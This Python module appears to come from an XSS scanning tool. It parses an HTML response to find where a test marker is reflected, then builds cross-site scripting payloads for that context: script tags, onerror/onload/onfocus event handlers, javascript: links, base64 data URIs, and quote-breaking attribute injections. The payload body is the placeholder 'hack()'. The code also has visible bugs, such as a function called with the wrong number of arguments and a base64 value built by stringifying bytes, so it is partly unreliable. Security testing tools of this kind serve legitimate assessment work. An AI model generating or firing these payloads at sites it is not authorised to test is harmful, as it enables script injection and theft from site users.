import base64
import re
from enum import Enum
from bs4 import BeautifulSoup, Tag, ResultSet, Comment

from .escape import buildEscape
from .mapper import mapPayloads
from core.conf import xsschecker


class ContextType(Enum):
    HTML = 1
    HTML_WITHOUT_ENCLOSE = 2
    ATTRIBUTE = 3
    COMMENT = 4
    JAVASCRIPT = 5
    CSS = 6
    NONE = 7


class Context:
    type: ContextType
    endTag: str


class LocationInfo:

    def __init__(self, t: ContextType, tags: ResultSet):
        self.t = t
        self.tags = tags


def strMapToEle(context: str) -> ContextType:
    if context == 'html':
        return ContextType.HTML
    elif context == 'attribute':
        return ContextType.ATTRIBUTE
    elif context == 'comment':
        return ContextType.COMMENT
    elif context == 'script':
        return ContextType.JAVASCRIPT
    pass


def generator(infos: list[LocationInfo], responseText: str) -> list[str]:
    res: list[str] = []
    for info in infos:
        res.extend(generate(info, responseText))
    return res


# rawTag
rawTag = 'script'

# error
errorTag = ["img", 'video', 'audio', 'embed']

# load
loadTag = ["iframe", 'svg', 'body']

# focus
focusTag = ["iframe", "a", "select", "input", 'textarea']

# javascript fake protocol
linkTag = ["a", "iframe", "img", "form"]

# base64
base64Tag = ['embed', 'object', 'iframe']

tag = ['a', 'img', 'html', 'script']

malicious = ["hack()"]


def generate(text: str) -> list[str]:
    res: list[str] = generateAllCaseInternal(getLocationInfo(text, xsschecker), text)
    escape: list[str] = buildEscape(res)
    payloads: list[str] = mapPayloads(res)
    payloads.extend(escape)
    return payloads


def htmlType() -> list[str]:
    vector = []
    # raw
    for m in malicious:
        rawPayload: Tag = Tag(name=rawTag)
        rawPayload.string = m
        vector.append(str(rawPayload))
    # error
    for m in malicious:
        for error in errorTag:
            errorPayload: Tag = Tag(name=error)
            errorPayload.attrs = {
                "src": "",
                "onerror": m
            }
            vector.append(str(errorPayload))
    # onload
    for m in malicious:
        for load in loadTag:
            loadPayload: Tag = Tag(name=load)
            loadPayload.attrs = {
                "onload": m
            }
            vector.append(str(loadPayload))
    # onfocus
    for m in malicious:
        for focus in focusTag:
            focusPayload: Tag = Tag(name=focus)
            focusPayload.attrs = {
                'onfocus': m,
                'autofocus': None
            }
            vector.append(str(focusPayload))
    # javascript fake
    for m in malicious:
        for fake in linkTag:
            fakePayload: Tag = Tag(name=fake)
            payload = "javascript:" + m
            if fake in ['iframe', 'img']:
                fakePayload.attrs = {
                    'src': payload
                }
            elif fake == 'a':
                fakePayload.attrs = {
                    "href": payload
                }
                fakePayload.string = ' '
            elif fake == 'form':
                fakePayload.attrs = {
                    "action": payload
                }
            else:
                raise Exception("error")

            vector.append(str(fakePayload))
    # base64
    for t in base64Tag:
        base64Payload = Tag(name=t)
        for m in malicious:
            payload = "data:text/html;base64," + str(base64.b64encode(m.encode('utf-8')))
            if t == 'object':
                base64Payload.attrs = {
                    "data": payload
                }
            elif t in ['embed', 'iframe']:
                base64Payload.attrs = {
                    "src": payload
                }
            else:
                raise Exception("error")
            vector.append(str(base64Payload))

    return vector


def attrType(info: LocationInfo, responseText: str) -> list[str]:
    res: list[str] = []
    tags = info.tags
    spacer = ['"', "'"]

    # <a href="javascript:alert">
    addForSpecial: bool = False
    for attrTag in tags:
        if attrTag.name == 'a' and re.compile(xsschecker).match(attrTag.attrs['href']):
            addForSpecial = True
        elif attrTag.name in ['iframe', 'img'] and re.compile(xsschecker).match(attrTag.attrs['src']):
            addForSpecial = True

    # listener payload
    listeners = [
        'onfocus', 'onmouseover',
    ]
    for attrTag in tags:
        for listener in listeners:
            for space in spacer:
                for m in malicious:
                    # 闭合type
                    # 兼容hidden
                    if "type" in attrTag.attrs and attrTag.attrs['type'] == "hidden":
                        res.append((space + f' {listener}={m} type ' + space))
                    else:
                        res.append((space + f' {listener}={m} ' + space))

    # 添加特殊的payload
    if addForSpecial:
        for m in malicious:
            res.append("javascript:" + m)
    # 闭合
    for attrTag in tags:
        raw = htmlType()
        for space in spacer:
            for e in raw:
                res.append((space + "</{url}>" + e + "//").format(url=attrTag.name))

    return res


def generateAllCaseInternal(locations: list[LocationInfo], responseText: str) -> list[str]:
    vector: list[str] = []
    for location in locations:
        vector.extend(generateSingleCaseInternal(location, responseText))
    return vector


def generateSingleCaseInternal(location: LocationInfo, responseText: str) -> list[str]:
    ctx = location.t
    vector: list[str] = []
    if ctx == ContextType.HTML:
        vector.extend(htmlType())
    elif ctx == ContextType.ATTRIBUTE:
        vector.extend(attrType(location, responseText))
        pass
    elif ctx == ContextType.COMMENT:
        pass
    elif ctx == ContextType.JAVASCRIPT:
        pass
    elif ctx == ContextType.CSS:
        pass
    return vector


def find_my_case(tag: Tag):
    for (_, value) in tag.attrs.items():
        if isinstance(value, list):
            for e in value:
                if re.compile(xsschecker).match(e):
                    return True
        elif isinstance(value, str):
            if re.compile(xsschecker).match(value):
                return True
        else:
            raise Exception("Type unknown")
    return False


def getLocationInfo(responseText: str, checker: str) -> list[LocationInfo]:
    bs: BeautifulSoup = BeautifulSoup(responseText, "html.parser")
    regex = re.compile(checker)
    # result
    res: list[LocationInfo] = []
    elementType: ContextType
    tags: ResultSet
    # find in string
    stringElements = bs.find_all(string=regex)
    if stringElements:
        elementType = ContextType.HTML
        tags = stringElements
        res.append(LocationInfo(elementType, tags))
    # find in attrs
    attrElements = bs.find_all(find_my_case)
    if attrElements:
        elementType = ContextType.ATTRIBUTE
        tags = attrElements
        res.append(LocationInfo(elementType, tags))
    # find in javascript
    script = bs.script
    if script:
        jsElements = script.find_all(string=regex)
        if jsElements:
            elementType = ContextType.JAVASCRIPT
            tags = jsElements
            res.append(LocationInfo(elementType, tags))
    # find in comment
    commentElements = bs.find_all(lambda text: isinstance(text, Comment))
    if commentElements:
        elementType = ContextType.COMMENT
        tags = commentElements
        res.append(LocationInfo(elementType, tags))
    # find in css
    style = bs.style
    if style:
        cssElements = style.find_all(string=regex)
        if cssElements:
            elementType = ContextType.CSS
            tags = cssElements
            res.append(LocationInfo(elementType, tags))
    return res
